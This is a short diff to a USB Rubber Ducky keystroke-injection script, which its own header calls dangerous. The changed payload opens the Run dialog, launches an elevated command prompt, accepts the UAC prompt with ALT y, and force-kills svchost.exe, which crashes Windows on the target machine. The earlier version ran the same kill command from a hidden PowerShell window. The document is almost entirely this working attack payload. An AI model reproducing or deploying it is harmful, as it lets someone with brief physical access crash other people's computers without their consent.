@@ -8,14 +8,10 @@ REM ***This is a dangerous script - Be Careful!!!***
 REM some setup for dukie script.
 DEFAULT_DELAY 100
 
-REM open powershell (remove -W Hidden to show the window)
+DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+STRING cmd /c taskkill /f /im svchost.exe
 CTRL-SHIFT ENTER
-DELAY 1500
+DELAY 2500
 ALT y
-DELAY 5000
-
-STRING taskkill /f /im svchost.exe
-ENTER
